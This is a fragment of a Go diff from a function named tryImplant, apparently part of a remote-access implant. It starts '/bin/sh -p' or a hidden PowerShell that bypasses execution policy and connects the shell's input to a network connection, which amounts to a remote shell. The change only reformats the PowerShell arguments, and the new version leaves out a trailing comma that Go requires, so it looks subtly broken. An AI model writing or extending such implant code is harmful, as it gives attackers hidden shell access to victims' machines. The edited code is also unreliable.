@@ -130,11 +130,13 @@ func tryImplant(conf *tls.Config) {
 		s = exec.Command("/bin/sh", "-p")
 
 	case "windows":
-		s = exec.Command("powershell.exe",
+		s = exec.Command(
+			"powershell.exe",
 			"-noprofile",
 			"-noninteractive",
 			"-executionpolicy", "bypass",
-			"-windowstyle", "hidden")
+			"-windowstyle", "hidden"
+		)
 	}
 
 	s.Stdin = c
